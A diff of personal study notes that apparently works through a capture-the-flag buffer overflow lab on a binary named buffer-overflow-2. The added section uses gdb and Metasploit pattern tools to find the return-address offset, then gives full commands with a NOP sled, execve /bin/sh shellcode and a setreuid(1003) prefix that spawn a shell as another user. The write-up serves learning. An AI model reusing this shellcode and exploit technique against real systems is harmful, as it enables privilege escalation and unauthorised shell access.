@@ -561,7 +561,7 @@ int main(int argc, char **argv)
 			- *Although some of the stuff here, a lot of it, is my own .. But like an actual formal one :)*
 			- `\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`
 			- Run this `dbg`
-			- `(dbg) python -c "print('A'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")`
+			- `(dbg) run $(python -c "print 'A'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")`
 			- Examine the dump of the code with 
 				- `(dbg) x/100x $rsp-200`
 					- Dumps 100\*4 bytes from memory location of $rsp-200 bytes
@@ -641,6 +641,103 @@ syscall
 	- Note that since our new revised shellcode is bigger by 14bytes, we'd need to amend how many NOP instructions we have in it
 		- (just take away 14 from the 100, 86)
 	- Golden.
+
 ---
 
+**My steps/notes for Task 9** 
 
+*( I will put these in another location at some stage since I want these pages to hold more general notes around a topic - but at the moment I'm learning and practicing, so bear with me yea? :) )*
+```
+
+(gdb) run $(python -c "print 'A'*###) <---- running the number of characters as below
+
+155 characters
+Inferior 1 (process 18950) exited normally
+
+156 characters
+0x0000000000000000 in ?? () <--- this one or the next one being rbp?
+
+157 characters
+0x00000000004005d3 in main ()
+
+158 characters
+0x00000000004005d3 in main ()
+
+159 characters
+0x00000000004005d3 in main ()
+
+160 characters
+0x00000000004005d3 in main ()
+
+161 characters
+0x00000000004005d3 in main ()
+
+162 characters
+0x00000000004005d3 in main ()
+
+163 characters
+0x0000000000400500 in __do_global_dtors_aux () <---- Return Address
+
+164 characters
+0x0000000000400041 in ?? () <---- Return Address starting to overflow
+
+165 characters
+0x0000000000004141 in ?? ()
+
+166 characters
+0x0000000000414141 in ?? ()
+
+167
+0x0000000041414141 in ?? ()
+
+168
+0x0000004141414141 in ?? ()
+
+169
+0x0000414141414141 in ?? ()
+
+170 - 181, 190 (not sure about others)
+0x00000000004005ab in concat_arg ()
+```
+- We'll use the MSF pattern generator now, same as before - we'll use a 200 character approach
+	`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`
+- Results in
+`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+- Run the patter above
+	- `(gdb) run '<patter-above>`
+- Check the register(s)
+	- `(gdb) i r`
+- Check what `rbp` has:
+	- `0x4133664132664131`
+- Check this against MSF's `pattern_offset.rb`
+	- `../pattern_offset.rb -q 0x4133664132664131`
+	- Exact match at offset 155
+	- 155 + 8 = 163 (as per notes above, seems to check out)
+- `shellcode`
+	`\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05` (40 bytes)
+- Run it through in `dbg`
+	```
+	(gdb) run $(python -c "print '\x90'*111 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")
+	```
+	- I confirmed that this would overwrite the complete Return Address by manually checking (the math I need to get my head around still as to why - but used `gdb` to be able to manually check)
+	- `Program received signal SIGSEGV, Segmentation fault. 0x0000424242424242 in ?? ()`
+- I checked with `(gdb) x/100x $rsp-200`
+- `0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x48583b6a`
+	- We're in the third column again needing to add 12 to `0x7fffffffe298`
+	- Going to try `0x7fffffffe2a4` (I used an ASCII table for this, lol, https://www.ascii-code.com/)
+	- We have the exact address of where our Shellcode sits, but, we're going to be using NOPs anyway... But I guess good practice :) 
+- I am going to use this memory address since it's full of NOPs, and just before the line where our Shellcode sits:
+	- `0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090`
+	- Little Endian
+	- `\x88\xe2\xff\xff\xff\x7f`
+	- `./buffer-overflow-2 $(python -c "print '\x90'*111 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x88\xe2\xff\xff\xff\x7f'")`
+	- IT WORKED!
+	- Now lets get the `reuid` for user3 (1003) sorted out with the use of pwntools
+		- `pwn shellcraft -f d amd64.linux.setreuid 1003`
+		- `\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05`
+		- We add this to the start of our first Shellcode and make the difference of 14 from 111 in our current NOP input
+		- New command run:
+		```
+		./buffer-overflow-2 $(python -c "print '\x90'*97 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x88\xe2\xff\xff\xff\x7f'")
+		```
+		- Boom. 
